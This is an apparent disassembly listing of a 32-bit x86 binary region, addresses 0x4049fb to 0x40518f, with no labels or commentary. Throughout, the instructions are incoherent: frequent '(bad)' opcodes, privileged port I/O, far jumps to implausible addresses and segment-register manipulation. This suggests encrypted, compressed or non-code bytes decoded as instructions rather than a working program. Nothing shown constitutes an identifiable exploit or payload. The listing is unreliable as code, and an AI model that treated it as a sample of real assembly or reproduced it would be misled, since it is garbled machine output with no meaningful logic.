  4049fb:	sbb    BYTE PTR [ecx],0x10
  4049fe:	sub    BYTE PTR [esi+esi*2],bl
  404a01:	scas   al,BYTE PTR es:[edi]
  404a02:	loop   0x404a4f
  404a04:	cmp    BYTE PTR [ebx+edi*4+0x21],bh
  404a08:	mov    ds:0x19a200e2,al
  404a0d:	add    esi,DWORD PTR [ebx]
  404a0f:	hlt    
  404a10:	jb     0x404a73
  404a12:	(bad)  
  404a13:	or     al,0xf4
  404a15:	lahf   
  404a16:	sub    BYTE PTR [ecx-0x23],dh
  404a19:	cmp    DWORD PTR [ebx+0x50],eax
  404a1c:	imul   ebx,DWORD PTR [ebx],0x254c8455
  404a22:	cmp    dh,cl
  404a24:	sbb    al,BYTE PTR [edi-0x79]
  404a27:	xchg   esi,eax
  404a28:	dec    ebx
  404a29:	dec    ecx
  404a2a:	fisubr DWORD PTR [eax]
  404a2c:	push   0x32
  404a2e:	leave  
  404a2f:	inc    edx
  404a30:	pop    es
  404a31:	cwde   
  404a32:	fidivr DWORD PTR [eax+ecx*8+0x52]
  404a36:	jns    0x404a91
  404a38:	pop    esi
  404a39:	test   eax,0xb02eee44
  404a3e:	out    dx,eax
  404a3f:	test   ch,0x61
  404a42:	xchg   ch,ah
  404a44:	sbb    cl,cl
  404a46:	add    eax,0x2055d3e8
  404a4b:	out    0x9d,al
  404a4d:	mov    esi,0x26536182
  404a52:	fs mov esp,0xcedcccc8
  404a58:	sbb    eax,0x4a78cf1d
  404a5d:	add    al,0x37
  404a5f:	loopne 0x404a0b
  404a61:	add    ebp,DWORD PTR ds:0xa5e5a65c
  404a67:	scas   al,BYTE PTR es:[edi]
  404a68:	dec    edi
  404a69:	and    bl,bl
  404a6b:	aad    0x42
  404a6d:	es jge 0x404a29
  404a70:	mov    esp,0xf3770ff5
  404a75:	and    eax,DWORD PTR [ebx+0x36]
  404a78:	mov    ah,0x96
  404a7a:	sti    
  404a7b:	pop    ds
  404a7c:	in     eax,dx
  404a7d:	test   DWORD PTR [ebp-0x4f],0xcd22fa57
  404a84:	push   ss
  404a85:	dec    eax
  404a86:	lods   eax,DWORD PTR ds:[esi]
  404a87:	sub    al,0x41
  404a89:	and    edi,ebp
  404a8b:	das    
  404a8c:	leave  
  404a8d:	sub    ebp,DWORD PTR [ebx+edx*4-0x3b89e79a]
  404a94:	cdq    
  404a95:	cld    
  404a96:	lea    edi,[edx+0x3acfa5bf]
  404a9c:	jmp    0x87cc24bd
  404aa1:	cmp    dh,al
  404aa3:	or     ecx,edi
  404aa5:	inc    ebp
  404aa6:	mov    dl,0x5
  404aa8:	(bad)  
  404aa9:	outs   dx,BYTE PTR ds:[esi]
  404aaa:	out    dx,eax
  404aab:	addr16 push ebp
  404aad:	cwde   
  404aae:	aas    
  404aaf:	push   esp
  404ab0:	jg     0x404a94
  404ab2:	jle    0x404aa0
  404ab4:	mov    WORD PTR [esi+0x2483f1ec],?
  404aba:	test   al,0x14
  404abc:	push   ds
  404abd:	icebp  
  404abe:	iret   
  404abf:	cmp    DWORD PTR [esi],eax
  404ac1:	cmp    al,0xab
  404ac3:	test   DWORD PTR [ebx-0x7a],esp
  404ac6:	push   eax
  404ac7:	mov    ebx,0x50ca50fd
  404acc:	(bad)  [edx+edx*4+0x7c1f8447]
  404ad3:	std    
  404ad4:	xlat   BYTE PTR ds:[ebx]
  404ad5:	into   
  404ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ad7:	sub    DWORD PTR [ecx+0x50],edx
  404ada:	and    bl,BYTE PTR [eax+0x7d8329c3]
  404ae0:	test   dl,0x2a
  404ae3:	push   edi
  404ae4:	dec    esp
  404ae5:	xchg   esi,eax
  404ae6:	aaa    
  404ae7:	adc    BYTE PTR [eax+0x4ee230d],dl
  404aed:	sub    eax,0xcc53a138
  404af2:	mov    ds:0xe986c3d2,eax
  404af7:	fwait
  404af8:	lods   al,BYTE PTR ds:[esi]
  404af9:	jg     0x404b42
  404afb:	xchg   DWORD PTR [edi],ebx
  404afd:	dec    eax
  404afe:	test   DWORD PTR [edi],esi
  404b00:	lods   eax,DWORD PTR ds:[esi]
  404b01:	loop   0x404b10
  404b03:	xchg   esp,eax
  404b04:	idiv   BYTE PTR [ecx+0x7f]
  404b07:	(bad)  
  404b08:	fldenv [ecx-0x3ad7543a]
  404b0e:	or     ch,BYTE PTR [edx-0x72]
  404b11:	(bad)  
  404b12:	and    eax,DWORD PTR [edx-0x7eaf443c]
  404b18:	idiv   BYTE PTR [bp+si+0x7178]
  404b1d:	xchg   edx,eax
  404b1e:	push   edx
  404b1f:	sub    DWORD PTR [edi],0x67
  404b22:	outs   dx,DWORD PTR ds:[esi]
  404b23:	lods   al,BYTE PTR ds:[esi]
  404b24:	arpl   WORD PTR [edi],si
  404b26:	add    BYTE PTR [esi+eax*1+0x13],0x4c
  404b2b:	sahf   
  404b2c:	mov    eax,esp
  404b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b2f:	call   0xc855:0xcd543eb9
  404b36:	add    ebp,DWORD PTR [ebx+0x12b4866d]
  404b3c:	push   edx
  404b3d:	fisubr DWORD PTR [ebx]
  404b3f:	inc    ebx
  404b40:	mov    ?,ebp
  404b42:	xor    al,0x52
  404b44:	gs popf 
  404b46:	mov    ebp,0xdc73c27
  404b4b:	pop    esp
  404b4c:	jbe    0x404b94
  404b4e:	or     cl,BYTE PTR [ebp+0x6becfffe]
  404b54:	mov    eax,0xead97201
  404b59:	out    0xd4,al
  404b5b:	push   esp
  404b5c:	bound  eax,QWORD PTR ds:0xe8cdc0b5
  404b62:	ds aam 0x72
  404b65:	dec    ebx
  404b66:	icebp  
  404b67:	and    al,cl
  404b69:	jmp    0x7e457b47
  404b6e:	sbb    ch,BYTE PTR [ebx-0x3d]
  404b71:	mov    ds:0xd9692ac1,eax
  404b76:	mov    bh,BYTE PTR [ebx]
  404b78:	sub    bh,cl
  404b7a:	imul   esp,DWORD PTR [ebx+0x3a],0xffffff98
  404b7e:	xchg   DWORD PTR ds:0xa341a136,ebx
  404b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b85:	pushf  
  404b86:	out    0x69,al
  404b88:	popa   
  404b89:	and    al,0x59
  404b8b:	inc    edi
  404b8c:	outs   dx,DWORD PTR ds:[esi]
  404b8d:	jge    0x404b76
  404b8f:	pushf  
  404b90:	push   cs
  404b91:	cmp    al,0xa5
  404b93:	ins    BYTE PTR es:[edi],dx
  404b94:	push   esi
  404b95:	push   edi
  404b96:	jne    0x404b18
  404b98:	inc    ecx
  404b99:	in     al,0x19
  404b9b:	push   ecx
  404b9c:	mov    ch,0x6
  404b9e:	xchg   ebp,eax
  404b9f:	push   esp
  404ba0:	mov    ecx,DWORD PTR [esi+0x9b46fec]
  404ba6:	xor    al,0x9a
  404ba8:	jl     0x404bea
  404baa:	popa   
  404bab:	mov    esp,0x8e23a9dc
  404bb0:	pop    ebp
  404bb1:	jmp    0x3e2b:0x619c8a7c
  404bb8:	arpl   WORD PTR ds:0xe7cf3cd5,sp
  404bbe:	mov    ebp,0x5732c3e5
  404bc3:	jae    0x404bd0
  404bc5:	fiadd  WORD PTR [edx]
  404bc7:	es loopne 0x404c43
  404bca:	mov    gs,edx
  404bcc:	mov    BYTE PTR [edx-0x24a019d8],cl
  404bd2:	std    
  404bd3:	mov    cl,0xb7
  404bd5:	fcom   QWORD PTR [eax+0x4a01ab4a]
  404bdb:	fcom   DWORD PTR [esi+0x279588bd]
  404be1:	sahf   
  404be2:	cmp    al,0x65
  404be5:	mov    ah,0xfe
  404be7:	sti    
  404be8:	xor    eax,0x2bf0297c
  404bed:	dec    ebx
  404bee:	or     eax,0xc26791a3
  404bf3:	pop    ss
  404bf4:	mov    cl,0xb5
  404bf6:	clc    
  404bf7:	es jo  0x404c0d
  404bfa:	fidiv  WORD PTR [ebp-0x2152685]
  404c00:	les    esi,FWORD PTR [edi+0x1045c0b7]
  404c06:	retf   
  404c07:	mov    edi,0xa2e3eed9
  404c0c:	cmp    al,0x4b
  404c0e:	inc    ecx
  404c0f:	fimul  WORD PTR [ecx-0x31]
  404c12:	pushf  
  404c13:	sub    eax,0x5c10b1b7
  404c18:	jmp    DWORD PTR [ecx-0x7b]
  404c1b:	cmp    BYTE PTR [ebp+0x6f],ch
  404c1e:	cmp    eax,DWORD PTR [ecx]
  404c20:	sahf   
  404c21:	inc    ecx
  404c22:	sbb    edi,esp
  404c24:	fstp   DWORD PTR [ebx]
  404c26:	ret    0x1d46
  404c29:	or     al,0xba
  404c2b:	das    
  404c2c:	jmp    0xde0c:0x469570b5
  404c33:	pop    ebp
  404c34:	cwde   
  404c35:	lea    ebp,[edx+0x4a]
  404c38:	mov    WORD PTR [ebx-0x3825f11f],ds
  404c3e:	push   ds
  404c3f:	hlt    
  404c40:	xchg   si,ax
  404c42:	push   ebx
  404c43:	enter  0xb7e1,0x80
  404c47:	jbe    0x404c38
  404c49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c4a:	in     eax,0xa2
  404c4c:	sub    al,0x5
  404c4e:	call   0xb4fb:0x71fc01f8
  404c55:	dec    ebp
  404c56:	std    
  404c57:	loop   0x404bde
  404c59:	xor    DWORD PTR [ebp-0x1c],0xffffffca
  404c5d:	les    edx,FWORD PTR [ecx+eiz*8-0x27bb67d5]
  404c64:	loop   0x404c57
  404c66:	out    dx,eax
  404c67:	mov    cl,0x1c
  404c69:	and    cl,BYTE PTR [esi-0x76f99b9a]
  404c6f:	and    ebx,eax
  404c71:	mov    ds:0xad314f87,eax
  404c76:	lahf   
  404c77:	inc    eax
  404c78:	in     al,0xf5
  404c7a:	mov    cl,0x9
  404c7c:	mov    bh,0x33
  404c7e:	adc    al,0x7f
  404c80:	sub    eax,DWORD PTR [ebx+0x43f8d57b]
  404c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c87:	pusha  
  404c88:	dec    DWORD PTR [ebx+ebx*4+0x74a7e493]
  404c8f:	leave  
  404c90:	shl    DWORD PTR [edi],1
  404c92:	out    dx,al
  404c93:	xchg   DWORD PTR [eax-0x7e753ac8],edx
  404c99:	mov    ch,0x63
  404c9b:	stc    
  404c9c:	ins    DWORD PTR es:[edi],dx
  404c9d:	out    dx,eax
  404c9e:	mov    esp,0x3ca7d189
  404ca3:	enter  0xa7b9,0x7f
  404ca7:	(bad)  
  404ca8:	(bad)  
  404ca9:	adc    esp,DWORD PTR [ebx]
  404cab:	mov    al,ds:0x7c2db706
  404cb0:	stos   DWORD PTR es:[edi],eax
  404cb1:	ins    BYTE PTR es:[edi],dx
  404cb2:	or     BYTE PTR [ecx-0xaa4f561],bh
  404cb8:	inc    ebp
  404cb9:	pushf  
  404cba:	data16 (bad) [edx+0x3f30d388]
  404cc1:	out    dx,al
  404cc2:	mov    bl,0x4f
  404cc4:	sbb    eax,DWORD PTR [ebp-0x64eb95d0]
  404cca:	mov    dl,0xf4
  404ccc:	and    edi,DWORD PTR [ebx-0x7d2856b]
  404cd2:	fsub   st,st(6)
  404cd4:	out    0x5b,al
  404cd6:	repnz rcr BYTE PTR [ebp+0x24e9d674],0x92
  404cde:	dec    esi
  404cdf:	(bad)  
  404ce0:	mov    ebx,0xd417dd11
  404ce5:	mov    esp,0xf44c17b8
  404cea:	arpl   WORD PTR [ebx],ax
  404cec:	(bad)  
  404ced:	out    0x79,eax
  404cef:	mov    dl,0xdd
  404cf1:	or     DWORD PTR fs:[edx+edi*2-0x4f],ebp
  404cf6:	xor    dh,BYTE PTR [edi]
  404cf8:	inc    edi
  404cf9:	inc    BYTE PTR [esp]
  404cfc:	test   BYTE PTR ds:0xc6d856fd,al
  404d02:	stc    
  404d03:	and    al,ah
  404d05:	jbe    0x404d21
  404d07:	loope  0x404ca0
  404d09:	mov    ah,0x91
  404d0b:	cmp    al,0x9d
  404d0d:	retf   0x1925
  404d10:	add    DWORD PTR [ecx+0x5d],edx
  404d13:	mov    esp,0xb005595e
  404d18:	cmp    BYTE PTR [ebx],ah
  404d1a:	lods   al,BYTE PTR ds:[esi]
  404d1b:	xchg   ebx,eax
  404d1c:	add    edi,ecx
  404d1e:	jb     0x404d78
  404d20:	add    esp,DWORD PTR [ebp+0x29]
  404d23:	retf   0x72ee
  404d26:	dec    esi
  404d27:	js     0x404d0c
  404d29:	sbb    BYTE PTR [eax],al
  404d2b:	mov    eax,0xf19dcdc
  404d30:	sbb    dh,cl
  404d32:	lahf   
  404d33:	ret    0x8ec5
  404d36:	popf   
  404d37:	adc    BYTE PTR [edx+eax*8+0x32be543d],ch
  404d3e:	jae    0x404dbe
  404d40:	xor    eax,0xb5e098e1
  404d45:	ins    BYTE PTR es:[edi],dx
  404d46:	loop   0x404d7b
  404d48:	je     0x404d0c
  404d4a:	xchg   edx,eax
  404d4b:	xor    ecx,DWORD PTR [esi-0x42afedf0]
  404d51:	jbe    0x404dd2
  404d53:	pop    ecx
  404d54:	pop    ss
  404d55:	or     DWORD PTR [edx+edx*2+0x3a2f88c2],ebp
  404d5c:	push   eax
  404d5d:	xor    esi,DWORD PTR [edx+edi*8]
  404d60:	cmp    dl,bh
  404d62:	push   esp
  404d63:	jne    0x404d01
  404d65:	jbe    0x404d1f
  404d67:	(bad)  
  404d68:	jge    0x404d7e
  404d6a:	mov    bh,0xe1
  404d6c:	sbb    esi,ecx
  404d6e:	or     al,al
  404d70:	into   
  404d71:	jp     0x404de4
  404d73:	icebp  
  404d74:	leave  
  404d75:	push   ss
  404d76:	pop    ecx
  404d77:	jb     0x404d5d
  404d79:	xchg   edi,eax
  404d7a:	clc    
  404d7b:	xor    al,0xe
  404d7d:	ja     0x404dcc
  404d7f:	aaa    
  404d80:	idiv   BYTE PTR [eax]
  404d82:	inc    edx
  404d83:	ret    0x894c
  404d86:	aad    0xab
  404d88:	mov    eax,ds:0x5188ee99
  404d8d:	push   edx
  404d8e:	xor    eax,0x6e7d25ba
  404d93:	mov    ebp,0x5fe1b484
  404d98:	(bad)  
  404d99:	ja     0x404d5f
  404d9b:	inc    esi
  404d9c:	inc    ebx
  404d9d:	aam    0x5b
  404d9f:	jle    0x404d9c
  404da1:	xor    al,0xc0
  404da3:	sub    bh,ch
  404da5:	(bad)  
  404da6:	and    esp,DWORD PTR [eax]
  404da8:	xchg   bx,ax
  404daa:	xlat   BYTE PTR ds:[ebx]
  404dab:	outs   dx,BYTE PTR ds:[esi]
  404dac:	rcl    DWORD PTR [ebp+0x7ef796ff],1
  404db2:	imul   ebp,DWORD PTR [ebp+0x20656647],0xfffffff7
  404db9:	nop
  404dba:	jnp    0x404da7
  404dbc:	cmp    eax,0x52061db7
  404dc1:	mov    al,0x83
  404dc3:	cmp    ecx,ebx
  404dc5:	sti    
  404dc6:	sub    al,0x9d
  404dc8:	mov    edi,0x4adf29ef
  404dcd:	push   es
  404dce:	sbb    al,0x73
  404dd0:	mov    edx,0x380bf8ca
  404dd5:	push   0xffffffdf
  404dd7:	jecxz  0x404e1f
  404dd9:	lods   eax,DWORD PTR ds:[esi]
  404dda:	xchg   ebp,eax
  404ddb:	pusha  
  404ddc:	ret    
  404ddd:	push   eax
  404dde:	xor    eax,0x393bc113
  404de3:	xor    BYTE PTR [esi+0x75],ch
  404de6:	pop    ebx
  404de7:	ret    
  404de8:	pushf  
  404de9:	dec    esp
  404dea:	(bad)  [ebx+esi*4]
  404ded:	lea    esi,[esi+eax*2+0x649a124b]
  404df4:	test   al,0xdd
  404df6:	inc    ebp
  404df7:	add    eax,DWORD PTR [ebx+0x2e]
  404dfa:	or     dh,dl
  404dfc:	out    0xa9,eax
  404dfe:	dec    esp
  404dff:	push   esp
  404e00:	int    0xd2
  404e02:	(bad)  
  404e03:	(bad)  
  404e04:	(bad)  
  404e05:	jnp    0x404d87
  404e07:	pushf  
  404e08:	sub    ebx,DWORD PTR [ecx-0x3]
  404e0b:	add    eax,0xd14e7266
  404e10:	sbb    eax,0xa624da6a
  404e15:	adc    ah,dl
  404e17:	pop    ss
  404e18:	inc    esi
  404e19:	adc    ch,BYTE PTR [ecx-0x44]
  404e1c:	or     bh,BYTE PTR [ebx-0x7d]
  404e1f:	pop    es
  404e20:	outs   dx,BYTE PTR ds:[esi]
  404e21:	sahf   
  404e22:	cmc    
  404e23:	sbb    eax,0xab80fcb7
  404e28:	or     ebx,DWORD PTR [ebp-0x3d]
  404e2b:	adc    BYTE PTR [eax-0x4e],ch
  404e2e:	inc    ecx
  404e2f:	push   cs
  404e30:	imul   esi,edi,0xffffff8f
  404e33:	mov    esp,0xd11cf23b
  404e38:	sti    
  404e39:	pop    edi
  404e3a:	add    eax,0x14ba5625
  404e3f:	push   cs
  404e40:	xchg   ebx,eax
  404e42:	data16 test al,0x8b
  404e45:	fwait
  404e46:	in     eax,dx
  404e47:	out    0x3e,al
  404e49:	inc    edx
  404e4a:	adc    bl,bl
  404e4c:	mov    esp,0x5b873a11
  404e51:	inc    edx
  404e52:	pop    ebx
  404e53:	fsub   st,st(2)
  404e55:	xchg   esi,eax
  404e56:	js     0x404e00
  404e58:	mov    DWORD PTR [esi+0x21],esi
  404e5b:	call   FWORD PTR [eax]
  404e5d:	mov    ds:0x22c8802d,eax
  404e62:	sub    edx,DWORD PTR [eax]
  404e64:	sti    
  404e65:	loopne 0x404e6e
  404e67:	jno    0x404ecd
  404e69:	jb     0x404e87
  404e6b:	sahf   
  404e6c:	sub    al,0x54
  404e6e:	outs   dx,DWORD PTR ds:[esi]
  404e6f:	lds    ebx,FWORD PTR [edx]
  404e71:	ret    0x9b3d
  404e74:	pop    eax
  404e75:	pushf  
  404e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e77:	mov    eax,0xdc1b447a
  404e7c:	div    BYTE PTR [ebx+eax*2+0x50b7acba]
  404e83:	inc    eax
  404e84:	push   edi
  404e85:	sahf   
  404e86:	xor    ebx,DWORD PTR [ebx-0x710fbf4b]
  404e8c:	jbe    0x404efc
  404e8e:	push   edi
  404e8f:	test   ah,dh
  404e91:	cmp    bh,cl
  404e93:	call   0x15d9fd2a
  404e98:	mov    ecx,0xe9571334
  404e9d:	test   BYTE PTR [esi+0x15],cl
  404ea0:	xor    BYTE PTR [edi-0x4b7d6780],dl
  404ea6:	(bad)  
  404ea7:	std    
  404ea8:	or     ebp,ebp
  404eaa:	xchg   esi,eax
  404eab:	mov    dl,0x5
  404ead:	fmul   QWORD PTR [esp+0x58]
  404eb1:	and    al,0x34
  404eb3:	std    
  404eb4:	cs jb  0x404e66
  404eb7:	fistp  QWORD PTR [ebp+0x26bf715a]
  404ebd:	les    ecx,FWORD PTR ds:0xf9b9d4a6
  404ec3:	cmp    ebx,DWORD PTR [edx]
  404ec5:	mov    al,BYTE PTR ds:0x7ea6121f
  404ecb:	jae    0x404eeb
  404ecd:	loopne 0x404f00
  404ecf:	push   ecx
  404ed0:	jns    0x404eaa
  404ed2:	dec    ebp
  404ed3:	lahf   
  404ed4:	idiv   BYTE PTR [edi]
  404ed6:	lods   al,BYTE PTR ds:[esi]
  404ed7:	stc    
  404ed8:	retf   0x4421
  404edb:	pushf  
  404edc:	and    cl,dh
  404ede:	push   edx
  404edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ee0:	enter  0x87e,0xe8
  404ee4:	out    0x90,al
  404ee6:	fwait
  404ee7:	jl     0x404f10
  404ee9:	sahf   
  404eea:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  404eec:	fisttp QWORD PTR [esi+0x65]
  404eef:	jl     0x404f4d
  404ef1:	cmp    BYTE PTR ds:0x50d37045,bh
  404ef7:	mov    bl,0xce
  404ef9:	ins    BYTE PTR es:[edi],dx
  404efa:	cli    
  404efb:	enter  0x3192,0x13
  404eff:	xchg   esi,eax
  404f00:	or     al,0x80
  404f02:	xchg   edi,eax
  404f03:	push   ds
  404f04:	inc    edx
  404f05:	or     eax,0xc148df1c
  404f0a:	loope  0x404f4b
  404f0c:	aam    0xad
  404f0e:	xchg   esp,eax
  404f0f:	loopne 0x404f2b
  404f11:	adc    BYTE PTR [ecx+esi*4-0x17],ah
  404f15:	add    al,0xc
  404f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f18:	das    
  404f19:	lds    edx,FWORD PTR [edx]
  404f1b:	arpl   WORD PTR [edi+0x6c9c6e77],si
  404f21:	cld    
  404f22:	cmc    
  404f23:	pushf  
  404f24:	push   ebp
  404f25:	stos   BYTE PTR es:[edi],al
  404f26:	mov    bh,0xa0
  404f28:	mov    cs:0x97d22495,eax
  404f2e:	sub    DWORD PTR [ecx],edi
  404f30:	ins    DWORD PTR es:[edi],dx
  404f31:	xchg   ecx,eax
  404f32:	or     BYTE PTR [esi+0xf13461d],0xce
  404f39:	into   
  404f3a:	sbb    BYTE PTR [edx-0x7d269037],bh
  404f40:	xor    ecx,ecx
  404f42:	cwde   
  404f43:	sbb    ah,BYTE PTR [ecx+ebp*8-0xe]
  404f47:	adc    eax,0xd04d70b3
  404f4c:	xor    BYTE PTR [ebx+0x33b5219e],dl
  404f52:	adc    ebx,DWORD PTR [ebx]
  404f54:	jmp    0x404f6d
  404f56:	mov    al,ds:0x70817ef7
  404f5b:	out    dx,al
  404f5c:	push   0xffffff8c
  404f5e:	push   ebx
  404f5f:	cmp    DWORD PTR [edx+0xd77539a],0xffffff91
  404f66:	into   
  404f67:	pop    ds
  404f68:	scas   al,BYTE PTR es:[edi]
  404f69:	rcl    BYTE PTR [edi],0x50
  404f6c:	(bad)  
  404f6d:	fdivr  st,st(1)
  404f6f:	je     0x404fbd
  404f71:	arpl   bp,sp
  404f73:	loop   0x404f20
  404f75:	inc    esi
  404f76:	push   ebp
  404f77:	bound  esp,QWORD PTR [esi+0x64a2740d]
  404f7d:	aam    0xea
  404f7f:	(bad)  
  404f80:	mov    eax,ds:0x4c75f241
  404f85:	jge    0x404fc3
  404f87:	dec    esi
  404f88:	test   al,0x8a
  404f8a:	cmp    DWORD PTR [edi],ebp
  404f8c:	ja     0x404f4b
  404f8e:	fimul  DWORD PTR [edx-0xccd3bb1]
  404f94:	xchg   edx,eax
  404f95:	in     al,0x2f
  404f97:	xchg   DWORD PTR [ebx-0x359f7cd3],esp
  404f9d:	(bad)
  404fa0:	sbb    eax,0xff6f873b
  404fa5:	pcmpeqd mm3,mm5
  404fa8:	add    eax,0xe40d5c77
  404fad:	cmp    al,0xf1
  404faf:	test   al,0x80
  404fb1:	rcr    ah,0x50
  404fb4:	mov    edi,esi
  404fb6:	test   al,0x2d
  404fb8:	pop    ss
  404fb9:	cwde   
  404fba:	sub    eax,ebx
  404fbc:	and    eax,0x42a2cb81
  404fc1:	imul   ebx,ebx,0x96f7e208
  404fc7:	xchg   esi,eax
  404fc8:	fst    DWORD PTR [esi+edx*4]
  404fcb:	in     eax,0x13
  404fcd:	fild   DWORD PTR [esp+esi*8]
  404fd0:	in     al,0xf
  404fd2:	jb     0x404fc6
  404fd4:	dec    BYTE PTR [ecx]
  404fd6:	jns    0x404f67
  404fd8:	jno    0x404f73
  404fda:	push   ss
  404fdb:	retf   
  404fdc:	and    eax,0xd245560f
  404fe1:	push   cs
  404fe2:	mov    dl,0xed
  404fe4:	mov    ds:0xe9ad8b5c,al
  404fe9:	cld    
  404fea:	push   esp
  404feb:	pop    eax
  404fec:	xchg   ebx,eax
  404fed:	scas   al,BYTE PTR es:[edi]
  404fee:	test   al,0x71
  404ff0:	jno    0x404fa8
  404ff2:	push   esi
  404ff3:	imul   ebp,esi,0xffffffda
  404ff6:	sbb    DWORD PTR [edx-0x6e],ebx
  404ff9:	nop
  404ffa:	out    dx,eax
  404ffb:	inc    esp
  404ffc:	lods   al,BYTE PTR ds:[esi]
  404ffd:	jl     0x405057
  404fff:	(bad)  
  405000:	cmp    edx,ecx
  405002:	jmp    0xd7db4a00
  405007:	out    dx,eax
  405008:	lahf   
  405009:	xchg   edi,eax
  40500a:	sti    
  40500b:	and    bl,dh
  40500d:	outs   dx,DWORD PTR ds:[esi]
  40500e:	dec    ecx
  40500f:	pop    es
  405010:	inc    eax
  405011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405012:	adc    al,0x25
  405014:	jnp    0x405074
  405016:	cmp    DWORD PTR [edx+0x31942114],0x14d6b79c
  405020:	icebp  
  405021:	fisub  WORD PTR [esi-0x69]
  405024:	xchg   esi,eax
  405025:	and    BYTE PTR [eax-0x44],al
  405028:	div    esp
  40502a:	cld    
  40502b:	sbb    BYTE PTR [esi-0x6f],ah
  40502e:	mov    dl,0x61
  405030:	pop    esp
  405031:	jmp    0x405063
  405033:	lds    esp,FWORD PTR [eax]
  405035:	inc    ecx
  405036:	cmp    edx,DWORD PTR [esi]
  405038:	or     BYTE PTR cs:[ecx],ah
  40503b:	je     0x4050ab
  40503d:	jb     0x4050b4
  40503f:	push   cs
  405040:	mov    dh,0x72
  405042:	mov    eax,ds:0xac8d06bc
  405047:	(bad)  
  405048:	jbe    0x40505b
  40504a:	sub    DWORD PTR [esi+0x54],esi
  40504d:	cmp    DWORD PTR [edx+0xc5b02ca],edi
  405053:	mov    eax,ds:0xba65e62
  405058:	xchg   edx,eax
  405059:	pushf  
  40505a:	test   BYTE PTR [esi+eiz*2],ah
  40505d:	stos   DWORD PTR es:[edi],eax
  40505e:	(bad)  
  40505f:	jle    0x405022
  405061:	mov    ds:0x48d46812,al
  405066:	pop    eax
  405067:	dec    edi
  405068:	mov    cl,0x8f
  40506a:	mov    esi,0x45074ea1
  40506f:	imul   esp,DWORD PTR [edx],0xe49c7285
  405075:	xor    dh,BYTE PTR [edi]
  405077:	adc    BYTE PTR es:[eax],bl
  40507a:	fild   QWORD PTR [edi]
  40507c:	xchg   esp,eax
  40507d:	sbb    DWORD PTR [ebp-0x2e],esi
  405080:	ss ret 
  405082:	idiv   eax
  405084:	jbe    0x405076
  405086:	jb     0x4050eb
  405088:	jmp    0x8885bda7
  40508d:	xchg   esp,eax
  40508e:	add    BYTE PTR [ecx+0xd],0x79
  405092:	cmp    eax,0xe5b33e0
  405097:	retf   
  405098:	add    ebp,esp
  40509a:	or     DWORD PTR [edx],ebp
  40509c:	add    BYTE PTR [eax-0x12c7dc0],al
  4050a2:	pop    ecx
  4050a3:	or     DWORD PTR [esi-0x22a137a4],eax
  4050a9:	push   eax
  4050aa:	jmp    0xc223951d
  4050af:	push   ebp
  4050b0:	retf   
  4050b1:	into   
  4050b2:	(bad)  
  4050b3:	iret   
  4050b4:	jmp    0x4050fe
  4050b6:	push   eax
  4050b7:	stos   BYTE PTR es:[edi],al
  4050b8:	add    al,0x62
  4050ba:	jg     0x4050aa
  4050bc:	xor    eax,0x6b3458da
  4050c1:	push   0xc4140a5f
  4050c6:	cmp    ebp,ecx
  4050c8:	jle    0x405072
  4050ca:	cmp    eax,0x854e25dd
  4050cf:	lods   al,BYTE PTR ds:[esi]
  4050d0:	es push edi
  4050d2:	out    0x1b,al
  4050d4:	pop    eax
  4050d5:	dec    edi
  4050d6:	int    0x9d
  4050d8:	in     al,0x39
  4050da:	mov    ch,0xe7
  4050dc:	jnp    0x405089
  4050de:	int3   
  4050df:	hlt    
  4050e0:	lods   eax,DWORD PTR ds:[esi]
  4050e1:	adc    BYTE PTR [edx+edi*4],dl
  4050e4:	mov    ch,0xff
  4050e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e7:	outs   dx,DWORD PTR ds:[esi]
  4050e8:	push   esi
  4050e9:	inc    edi
  4050ea:	popw   es
  4050ec:	clc    
  4050ed:	push   edi
  4050ee:	shr    BYTE PTR [ebp+0x17],cl
  4050f1:	mov    al,dh
  4050f3:	mov    eax,0x9809303c
  4050f8:	jg     0x4050f4
  4050fa:	inc    esi
  4050fb:	(bad)  [ecx-0xb2147e2]
  405101:	mov    cl,BYTE PTR ds:0xc3a7c484
  405107:	sahf   
  405108:	push   0xffffffd2
  40510a:	pop    ds
  40510b:	fs lahf 
  40510d:	in     eax,dx
  40510e:	cmc    
  40510f:	sub    eax,0x6d4497d0
  405114:	fldpi  
  405116:	mov    ebx,0x9b80a83e
  40511b:	sbb    al,0x21
  40511d:	mov    esi,0xd07ffb94
  405122:	push   ds
  405123:	aam    0x8d
  405125:	retf   
  405126:	mov    dl,0x95
  405128:	imul   DWORD PTR [edx-0x69]
  40512b:	aam    0x17
  40512d:	ss mov dh,0xc5
  405130:	jns    0x40512b
  405132:	sbb    esi,0x46
  405135:	nop
  405136:	retf   0x1c9b
  405139:	push   ecx
  40513a:	addr16 add bh,dh
  40513d:	mov    ah,0x12
  40513f:	stc    
  405140:	xchg   esi,eax
  405141:	or     edx,ebp
  405143:	mov    ch,ah
  405145:	inc    ebp
  405146:	inc    ebp
  405147:	mov    esi,ebp
  405149:	inc    edi
  40514a:	loope  0x405114
  40514c:	push   0xfcb52bcb
  405151:	pop    ss
  405152:	push   ds
  405153:	push   ss
  405154:	sti    
  405155:	(bad)  [ebx+edi*8]
  405158:	add    BYTE PTR [ebx+eiz*1-0x16214a70],0x35
  405160:	into   
  405161:	gs scas eax,DWORD PTR es:[edi]
  405163:	test   al,0xd3
  405165:	jmp    0x405154
  405167:	push   esi
  405168:	test   eax,0xb222babb
  40516d:	jo     0x40516d
  40516f:	push   es
  405170:	xchg   esp,eax
  405171:	lods   al,BYTE PTR ds:[esi]
  405172:	mov    ebx,0x14a974da
  405177:	push   ebx
  405178:	add    DWORD PTR [esi-0x4d],ebp
  40517b:	jb     0x40515a
  40517d:	test   eax,0x5ae04ed
  405182:	xchg   esi,eax
  405183:	mov    ebp,0x4bed44e7
  405188:	cmc    
  405189:	fst    QWORD PTR ds:0x3de3e3b8
  40518f:	or     al,0x8f
